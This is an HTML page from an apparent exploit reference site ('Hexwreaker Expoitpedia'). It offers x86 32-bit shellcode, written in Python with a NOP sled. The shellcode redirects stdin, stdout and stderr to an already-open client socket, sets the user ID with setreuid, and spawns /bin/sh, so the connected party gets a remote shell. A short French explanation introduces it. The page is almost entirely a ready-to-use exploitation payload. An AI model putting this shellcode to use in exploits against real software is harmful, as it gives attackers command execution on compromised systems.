<!DOCTYPE html>
<html lang="en">
<head class="page-header" role="banner">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hexwreaker Expoitpedia</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <canvas id="container"></canvas>
    <script src="/script.js"></script>

    <div id="main" class="main-content" role="main">
        <div id="nav-bar">
            <div id="nav-home" class="nav-item"><a href="/"><img src="/src/images/home.jpg"/></a></div>
        </div>
        <h4 id="exploitpedia"><a href="/pages/exploitpedia/exploitpedia">ExploitPedia</a></h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cible : x86 32 bits
</code></pre></div></div>

<p>Le shellcode suivant permet de converger les entrées et sorties standards (<strong>stdin, stdout, stderr</strong>) vers le socket du client. Puis, il permet d’ouvrir un terminal afin que le client exécute des commandes à travers le socket.</p>

<p>Le <strong>fd</strong> du socket, précédemment ouvert est récupéré dans la pile au début du shellcode (pop edi; pop edi).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">asm_code</span>  <span class="o">=</span> <span class="s">"nop;"</span><span class="o">*</span><span class="mi">150</span>
<span class="n">asm_code</span> <span class="o">+=</span> <span class="s">"""
# dup2(socket_fd, stdin)
    pop edi
    pop edi
    mov ebx, edi
    xor eax, eax
    mov ecx, eax
    mov al, 0x3f
    int 0x80
# dup2(socket_fd, stdout)
    mov ebx, edi
    mov ecx, 0x1
    xor eax, eax
    mov al, 0x3f
    int 0x80
# dup2(socket_fd, stderr)
    mov ebx, edi
    mov ecx, 0x2
    xor eax, eax
    mov al, 0x3f
    int 0x80
# setreuid(0x4d0, ...)
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    mov bx, 0x4d0
    mov cx, 0x4d0
    mov al, 0x46
    int 0x80
# execve("/bin//sh")
    xor eax, eax ;  # eax = 0
    push eax ; 
    push 0x68732f2f ; 
    push 0x6e69622f ; 
    mov ebx, esp ;   # ebx = &amp;"/bin//sh"
    push eax ; 
    mov edx, esp ;
    push ebx ; 
    mov ecx, esp ;   # ecx = &amp;args
    mov al, 0xb ;   # eax = 0xb
    int 0x80
"""</span>
</code></pre></div></div>


    </div>
</body>
</html>
